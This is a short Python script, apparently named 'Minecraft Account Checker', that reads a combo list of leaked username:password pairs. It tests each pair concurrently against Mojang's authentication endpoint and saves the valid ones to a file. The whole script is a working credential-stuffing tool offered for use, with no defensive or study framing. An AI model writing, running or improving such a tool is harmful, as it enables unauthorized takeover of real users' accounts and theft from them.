import requests,os
from multiprocessing.dummy import Pool
from tkinter.filedialog import askopenfilename
from tkinter import Tk
from colorama import Fore

clear = lambda : os.system("cls")
root = Tk(); root.withdraw(); requests.urllib3.disable_warnings()


class Check():
    def __init__(self):
        self.name = '''                                   
                                        [Minecraft Account Checker]
                                                By Kynda
        '''
        self.api = "https://authserver.mojang.com/authenticate"
        self.filename = askopenfilename(title="Combo ?")
        self.combo = [i.strip() for i in open(self.filename,"r",encoding='utf8')]
        self.len = len(self.combo)
        self.hits = 0
        self.invalid = 0
        self.pos = 0
    def run(self, account):
        user, password = account.split(':')[0],account.split(':')[1]
        if 'accessToken' in requests.post(self.api, json={"agent":{"name":"Minecraft","version":1},"username":user,"password":password}).json():
            self.save(account)
            self.hits += 1
        else:
            self.invalid += 1
        self.pos += 1
    def save(self, account):
        with open("save.txt", "a",encoding='utf8') as file:
            file.write(account)
    def result(self):
        clear()
        print(Fore.CYAN+self.name)
        print(Fore.CYAN+ '                                    Checked:         '+str(self.pos) + '/' + str(self.len))
        print(Fore.CYAN+'                                    ' + Fore.GREEN + 'Hits:   '+str(self.hits))
        print(Fore.CYAN+'                                    ' + Fore.RED + 'Invalid:   '+str(self.invalid)+Fore.RESET)

check = Check()
mp = Pool(10)
mp.map(check.run,check.combo)
mp.close()
mp.join()
check.result()